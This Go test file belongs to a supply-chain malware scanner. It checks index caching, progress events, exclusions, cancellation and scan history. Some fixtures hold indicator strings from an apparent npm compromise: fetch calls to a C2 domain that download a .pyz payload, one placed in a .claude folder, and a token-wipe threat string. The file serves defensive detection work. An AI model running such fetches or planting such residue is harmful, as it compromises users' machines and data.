package main

import (
	"context"
	"os"
	"path/filepath"
	"strconv"
	"testing"
)

func TestIndexedScanSkipsUnchangedFilesAndReturnsCachedFindings(t *testing.T) {
	dir := t.TempDir()
	manifest := filepath.Join(dir, "package.json")
	if err := os.WriteFile(manifest, []byte(`{"dependencies":{"@tanstack/react-router":"1.169.5"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	firstProgress := []ScanProgress{}
	firstFindings, err := newTestScannerWithOptions(index, func(progress ScanProgress) {
		firstProgress = append(firstProgress, progress)
	}).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(firstFindings) == 0 {
		t.Fatal("expected first scan to find affected package")
	}
	if last := firstProgress[len(firstProgress)-1]; last.Scanned == 0 || last.Skipped != 0 {
		t.Fatalf("expected first scan to scan files without skips, got scanned=%d skipped=%d", last.Scanned, last.Skipped)
	}

	secondProgress := []ScanProgress{}
	secondFindings, err := newTestScannerWithOptions(index, func(progress ScanProgress) {
		secondProgress = append(secondProgress, progress)
	}).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(secondFindings) != len(firstFindings) {
		t.Fatalf("expected cached findings to be returned, got %d want %d", len(secondFindings), len(firstFindings))
	}
	if last := secondProgress[len(secondProgress)-1]; last.Scanned != 0 || last.Skipped == 0 {
		t.Fatalf("expected second scan to skip unchanged files, got scanned=%d skipped=%d", last.Scanned, last.Skipped)
	}
}

func TestScanProgressResetsPercentWhenScanningStarts(t *testing.T) {
	dir := t.TempDir()
	manifest := filepath.Join(dir, "package.json")
	if err := os.WriteFile(manifest, []byte(`{"dependencies":{"@tanstack/react-router":"1.169.5"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	var progress []ScanProgress
	if _, err := newTestScannerWithOptions(index, func(item ScanProgress) {
		progress = append(progress, item)
	}).Scan([]string{dir}); err != nil {
		t.Fatal(err)
	}
	for _, item := range progress {
		if item.Phase == "scanning" {
			if item.Processed == 0 && item.Percent != 0 {
				t.Fatalf("expected scanning phase to start at 0 percent, got %#v", item)
			}
			return
		}
	}
	t.Fatalf("expected scanning progress event, got %#v", progress)
}

func newTestScannerWithOptions(index *FileIndex, progress ScanProgressFunc) *Scanner {
	scanner := NewScannerWithOptions(index, progress)
	scanner.UseRemoteDetectionBundle(&RemoteDetectionBundle{Packs: []*RemoteDetectionPack{testRemotePack()}})
	return scanner
}

func TestScanPipelineBatchesIndexWrites(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i < indexBatchSize+5; i++ {
		path := filepath.Join(dir, "package-"+string(rune('a'+(i%26)))+"-"+strconv.Itoa(i), "package.json")
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(`{"dependencies":{"left-pad":"1.3.0"}}`), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %#v", findings)
	}

	var indexed int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index`).Scan(&indexed); err != nil {
		t.Fatal(err)
	}
	if indexed < indexBatchSize+5 {
		t.Fatalf("expected batched writer to index all files, got %d", indexed)
	}
}

func TestFastScanIndexesIrrelevantFilesWithoutContentScan(t *testing.T) {
	dir := t.TempDir()
	irrelevant := filepath.Join(dir, "src", "main.rs")
	if err := os.MkdirAll(filepath.Dir(irrelevant), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(irrelevant, []byte("gh-token-monitor IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner"), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected non-candidate source file to be metadata-only, got findings %#v", findings)
	}

	var rows int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index WHERE path = ?`, irrelevant).Scan(&rows); err != nil {
		t.Fatal(err)
	}
	if rows != 0 {
		t.Fatalf("expected metadata-only file not to be persisted, got %d rows", rows)
	}
}

func TestFastScanStillScansPackageManifests(t *testing.T) {
	dir := t.TempDir()
	manifest := filepath.Join(dir, "package.json")
	if err := os.WriteFile(manifest, []byte(`{"dependencies":{"@tanstack/react-router":"1.169.5"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected package manifest to be content scanned")
	}

	var sha string
	if err := index.db.QueryRow(`SELECT sha256 FROM file_index WHERE path = ?`, manifest).Scan(&sha); err != nil {
		t.Fatal(err)
	}
	if sha == "" {
		t.Fatal("expected package manifest to be content hashed")
	}
}

func TestProjectProfileDoesNotContentScanArbitraryDependencyFiles(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "node_modules", "left-pad", "index.js")
	if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte("fetch('https://git-tanstack.com')"), 0o644); err != nil {
		t.Fatal(err)
	}
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected arbitrary dependency source to stay metadata-only in project scan, got %#v", findings)
	}
	var rows int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index WHERE path = ?`, file).Scan(&rows); err != nil {
		t.Fatal(err)
	}
	if rows != 0 {
		t.Fatalf("expected arbitrary dependency source not to be persisted, got %d rows", rows)
	}
}

func TestProjectProfileScansDependencyLoaderCandidates(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "node_modules", "left-pad", "setup.js")
	if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte("fetch('https://git-tanstack.com')"), 0o644); err != nil {
		t.Fatal(err)
	}
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	assertSeverityContains(t, findings, "high", "ioc-string", "C2 domain")
}

func TestMissingScanRootsAreSilent(t *testing.T) {
	dir := t.TempDir()
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	missing := filepath.Join(dir, "missing-token-file")
	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{missing})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected missing root to be silently skipped, got %#v", findings)
	}
}

func TestSingleFileScanRootIsScanned(t *testing.T) {
	dir := t.TempDir()
	manifest := filepath.Join(dir, "package.json")
	if err := os.WriteFile(manifest, []byte(`{"dependencies":{"@tanstack/react-router":"1.169.5"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	findings, err := newTestScannerWithOptions(index, nil).Scan([]string{manifest})
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "affected-package", "@tanstack/react-router@1.169.5 in dependencies")
}

func TestShaiHuludProfileScansWorkspaceResidue(t *testing.T) {
	dir := t.TempDir()
	residue := filepath.Join(dir, ".claude", "router-note.js")
	if err := os.MkdirAll(filepath.Dir(residue), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(residue, []byte("fetch('https://git-tanstack.com/tmp/transformers.pyz')"), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	projectScanner := newTestScannerWithOptions(index, nil)
	projectFindings, err := projectScanner.Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(projectFindings) != 0 {
		t.Fatalf("expected project profile to skip arbitrary workspace residue, got %#v", projectFindings)
	}

	shaiScanner := newTestScannerWithOptions(index, nil)
	shaiScanner.SetProfile(ScanProfileShaiHulud)
	shaiFindings, err := shaiScanner.Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	assertSeverityContains(t, shaiFindings, "high", "ioc-string", "C2 domain")
}

func TestScannerExcludedDirsSkipIndexAndFindings(t *testing.T) {
	dir := t.TempDir()
	excluded := filepath.Join(dir, "vendor-cache")
	included := filepath.Join(dir, "project")
	if err := os.MkdirAll(excluded, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(included, 0o755); err != nil {
		t.Fatal(err)
	}
	excludedManifest := filepath.Join(excluded, "package.json")
	includedManifest := filepath.Join(included, "package.json")
	if err := os.WriteFile(excludedManifest, []byte(`{"dependencies":{"@tanstack/react-router":"1.169.5"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(includedManifest, []byte(`{"dependencies":{"left-pad":"1.3.0"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	scanner := newTestScannerWithOptions(index, nil)
	scanner.SetExcludedDirs([]string{excluded})
	findings, err := scanner.Scan([]string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected excluded affected package to be skipped, got %#v", findings)
	}

	var excludedRows int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index WHERE path = ?`, excludedManifest).Scan(&excludedRows); err != nil {
		t.Fatal(err)
	}
	if excludedRows != 0 {
		t.Fatalf("expected excluded manifest not to be indexed, got %d rows", excludedRows)
	}
	var includedRows int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index WHERE path = ?`, includedManifest).Scan(&includedRows); err != nil {
		t.Fatal(err)
	}
	if includedRows != 1 {
		t.Fatalf("expected included manifest to be indexed, got %d rows", includedRows)
	}
}

func TestSettingsPersistExcludedDirsWithoutDefaultDot(t *testing.T) {
	dir := t.TempDir()
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	if err := index.SaveSettings(AppSettings{}); err != nil {
		t.Fatal(err)
	}
	empty, err := index.LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if len(empty.ExcludedDirs) != 0 {
		t.Fatalf("expected empty excludes to stay empty, got %#v", empty.ExcludedDirs)
	}

	want := filepath.Join(dir, "cache")
	if err := index.SaveSettings(AppSettings{ExcludedDirs: []string{want, want}}); err != nil {
		t.Fatal(err)
	}
	loaded, err := index.LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if len(loaded.ExcludedDirs) != 1 || loaded.ExcludedDirs[0] != want {
		t.Fatalf("expected normalized deduped exclude %q, got %#v", want, loaded.ExcludedDirs)
	}
}

func TestCachedPackageManifestBackfillsInventory(t *testing.T) {
	dir := t.TempDir()
	manifest := filepath.Join(dir, "package.json")
	if err := os.WriteFile(manifest, []byte(`{"dependencies":{"left-pad":"1.3.0"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	if _, err := NewScannerWithOptions(index, nil).Scan([]string{dir}); err != nil {
		t.Fatal(err)
	}
	if _, err := index.db.Exec(`DELETE FROM package_inventory`); err != nil {
		t.Fatal(err)
	}
	progress := []ScanProgress{}
	if _, err := NewScannerWithOptions(index, func(item ScanProgress) {
		progress = append(progress, item)
	}).Scan([]string{dir}); err != nil {
		t.Fatal(err)
	}
	if last := progress[len(progress)-1]; last.Scanned != 0 || last.Skipped == 0 {
		t.Fatalf("expected second scan to use cached manifest, got scanned=%d skipped=%d", last.Scanned, last.Skipped)
	}

	var rows int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM package_inventory WHERE source_path = ? AND name = ? AND version = ?`, manifest, "left-pad", "1.3.0").Scan(&rows); err != nil {
		t.Fatal(err)
	}
	if rows != 1 {
		t.Fatalf("expected cached manifest to backfill package inventory, got %d rows", rows)
	}
	var packageCount int
	if err := index.db.QueryRow(`SELECT package_count FROM file_index WHERE path = ?`, manifest).Scan(&packageCount); err != nil {
		t.Fatal(err)
	}
	if packageCount != 1 {
		t.Fatalf("expected file index package count to be restored after backfill, got %d", packageCount)
	}
}

func TestScanCancellationStopsIndexWrites(t *testing.T) {
	dir := t.TempDir()
	const fileCount = 900
	for i := 0; i < fileCount; i++ {
		path := filepath.Join(dir, "scan-target-"+strconv.Itoa(i), "package.json")
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(`{"name":"scan-target"}`), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	stopped := false
	findings, err := NewScannerWithOptions(index, func(progress ScanProgress) {
		if progress.Phase == "scanning" && progress.Processed >= 1 {
			cancel()
		}
		if progress.Done && progress.Status == "stopped" {
			stopped = true
		}
	}).ScanContext(ctx, []string{dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %#v", findings)
	}
	if !stopped {
		t.Fatal("expected stopped final progress after cancellation")
	}

	var indexed int
	if err := index.db.QueryRow(`SELECT COUNT(*) FROM file_index`).Scan(&indexed); err != nil {
		t.Fatal(err)
	}
	if indexed >= fileCount {
		t.Fatalf("expected cancellation to stop before indexing every file, got %d", indexed)
	}
}

func TestScanRunHistoryPersistsLastScan(t *testing.T) {
	dir := t.TempDir()
	index, err := OpenScanIndex(filepath.Join(dir, "scan-index.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	defer index.Close()

	want := ScanResult{
		StartedAt:  "2026-05-12T10:00:00Z",
		FinishedAt: "2026-05-12T10:00:02Z",
		Roots:      []string{dir},
		Findings: []Finding{{
			DetectionID: "test",
			Severity:    "high",
			Kind:        "affected-package",
			Path:        filepath.Join(dir, "package.json"),
			Evidence:    "test evidence",
		}},
		Indexed: true,
	}
	if err := index.SaveScanRun(want); err != nil {
		t.Fatal(err)
	}
	got, ok, err := index.LastScanRun()
	if err != nil {
		t.Fatal(err)
	}
	if !ok {
		t.Fatal("expected last scan")
	}
	if got.FinishedAt != want.FinishedAt || got.Status != "completed" || len(got.Findings) != 1 || got.Findings[0].Evidence != want.Findings[0].Evidence {
		t.Fatalf("unexpected last scan: %#v", got)
	}

	canceled := want
	canceled.FinishedAt = "2026-05-12T10:00:03Z"
	canceled.Status = "canceled"
	canceled.Findings[0].Evidence = "partial evidence"
	if err := index.SaveScanRun(canceled); err != nil {
		t.Fatal(err)
	}
	got, ok, err = index.LastScanRun()
	if err != nil {
		t.Fatal(err)
	}
	if !ok {
		t.Fatal("expected last scan")
	}
	if got.FinishedAt != canceled.FinishedAt || got.Status != "canceled" || len(got.Findings) != 1 || got.Findings[0].Evidence != "partial evidence" {
		t.Fatalf("expected canceled scan to be persisted, got %#v", got)
	}
}
